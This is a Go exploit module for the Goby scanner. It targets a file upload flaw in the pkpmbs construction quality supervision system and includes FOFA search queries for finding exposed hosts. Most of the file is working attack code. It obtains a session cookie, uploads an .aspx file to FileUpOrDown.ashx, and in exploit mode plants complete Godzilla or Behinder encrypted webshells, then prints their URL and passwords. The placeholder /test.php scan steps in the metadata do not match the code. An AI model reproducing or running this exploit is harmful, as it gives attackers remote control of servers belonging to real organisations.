package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "pkpmbs FileUpOrDown.aspx File Upload",
    "Description": "<p>Pkpmbs is a B/S structure inspection information supervision system of Hunan Jianyan Information Technology Co., Ltd., which is combined with the project quality inspection management system.</p><p>There is a file upload vulnerability in pkpmbs, which allows attackers to gain server control privileges.</p><p></p><p>The affected version is the latest version: 2023-02-15 111309 and below.</p>",
    "Product": "Pkpmbs",
    "Homepage": "http://www.hunanjianyan.com/product/detail/16.html",
    "DisclosureDate": "2023-03-05",
    "Author": "1243099890@qq.com",
    "FofaQuery": "body=\"/Content/Theme/Standard/\" || body=\"Standard/DownSoftFile\" || body=\"Website/resource/js/xxtea.js\" || body=\"/Scripts/myJs/public.js\" || body=\"/ProjectManagement/login\"",
    "GobyQuery": "body=\"/Content/Theme/Standard/\" || body=\"Standard/DownSoftFile\" || body=\"Website/resource/js/xxtea.js\" || body=\"/Scripts/myJs/public.js\" || body=\"/ProjectManagement/login\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in pkpmbs, which allows attackers to gain server control privileges.</p>",
    "Recommendation": "<p>1. Strictly limit the types of files that can be uploaded at the vulnerability point.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom,webshell",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.txt",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "smpanu1051hyb",
            "show": "attackType=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "pkpmbs 建设工程质量监督系统 FileUpOrDown.aspx 文件上传漏洞",
            "Product": "pkpmbs",
            "Description": "<p>pkpmbs 建设工程质量监督系统是湖南建研信息技术股份有限公司一个与工程质量检测管理系统相结合的，B/S架构的检测信息监管系统。</p><p>pkpmbs 存在文件上传漏洞，攻击者可以通过该漏洞获取服务器控制权限。</p>",
            "Recommendation": "<p>1、严格限制漏洞点可上传文件类型。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>pkpmbs 存在文件上传漏洞，攻击者可以通过该漏洞获取服务器控制权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "pkpmbs FileUpOrDown.aspx File Upload",
            "Product": "Pkpmbs",
            "Description": "<p>Pkpmbs is a B/S structure inspection information supervision system of Hunan Jianyan Information Technology Co., Ltd., which is combined with the project quality inspection management system.<br></p><p>There is a file upload vulnerability in pkpmbs, which allows attackers to gain server control privileges.<br></p><p></p><p>The affected version is the latest version: 2023-02-15 111309 and below.</p>",
            "Recommendation": "<p>1. Strictly limit the types of files that can be uploaded at the vulnerability point.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>There is a file upload vulnerability in pkpmbs, which allows attackers to gain server control privileges.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-30",
    "PocId": "10836"
}`

	getCookie51JONHGsknn := func(hostinfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uri := "/Login.cshtml"
		getConfig := httpclient.NewGetRequestConfig(uri)
		getConfig.VerifyTls = false
		getConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostinfo, getConfig)
	}
	uploadFileD7P8sjkpqadn := func(hostInfo *httpclient.FixUrl, fileName, Cookie, fileContent string) (*httpclient.HttpResponse, error) {
		uri := "/Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName=" + fileName + ""
		postConfig := httpclient.NewPostRequestConfig(uri)
		postConfig.VerifyTls = false
		postConfig.FollowRedirect = false
		postConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP")
		postConfig.Header.Store("Cookie", Cookie)
		postConfig.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
		postConfig.Data = fmt.Sprintf("------WebKitFormBoundarybqACRhAMBHmQQAUP\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"1.aspx\"\r\nContent-Type: image/png\r\n\r\n%s\r\n------WebKitFormBoundarybqACRhAMBHmQQAUP--", fileContent)
		resp, _ := httpclient.DoHttpRequest(hostInfo, postConfig)
		if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "1|/Excel/Templete/") {
			uri := "/Excel/Templete/" + fileName + ""
			getConfig := httpclient.NewGetRequestConfig(uri)
			getConfig.VerifyTls = false
			getConfig.FollowRedirect = false
			return httpclient.DoHttpRequest(hostInfo, getConfig)
		}
		return nil, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := getCookie51JONHGsknn(hostInfo)
			if err != nil {
				return false
			} else if resp.StatusCode != 200 {
				return false
			}
			randName := goutils.RandomHexString(6) + ".aspx"
			fileContent := `e165421110ba03099a1c0393373c5b43
<%@ Page Language="C#" Debug="true" %>
<%@ import Namespace="System"%>
<%@ import Namespace="System.IO"%>
<% string pageName = Request.PhysicalPath;%>
<% File.Delete(pageName);%>`
			resp, _ = uploadFileD7P8sjkpqadn(hostInfo, randName, resp.Cookie, fileContent)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e165421110ba03099a1c0393373c5b43")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			webshell := goutils.B2S(stepLogs.Params["webshell"])
			var filename, content string
			resp, err := getCookie51JONHGsknn(expResult.HostInfo)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			} else if resp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			if attackType == "webshell" {
				filename = goutils.RandomHexString(6) + ".aspx"
				if webshell == "godzilla" {
					content = `<%@ Page Language="C#"%><%try { string key = "3c6e0b8a9c15224a"; string pass = "pass"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Application["payload"] == null) { Context.Application["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Application["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { } %>`
				} else if webshell == "behinder" {
					content = `<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>`
				}
			} else if attackType == "custom" {
				content = goutils.B2S(stepLogs.Params["content"])
				filename = goutils.B2S(stepLogs.Params["filename"])
			}
			resp, err = uploadFileD7P8sjkpqadn(expResult.HostInfo, filename, resp.Cookie, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if resp.StatusCode == 200 || (resp.StatusCode == 500 && strings.Contains(resp.Utf8Html, "填充无效")) {
				expResult.Success = true
				expResult.Output = fmt.Sprintf("WebShell URL: %s\n", expResult.HostInfo.FixedHostInfo+"/Excel/Templete/"+filename)
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：CSHARP_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.0.1\n"
				}
				if attackType != "custom" {
					expResult.Output += "Webshell type: ASPX"
				}
			}
			return expResult
		},
	))
}
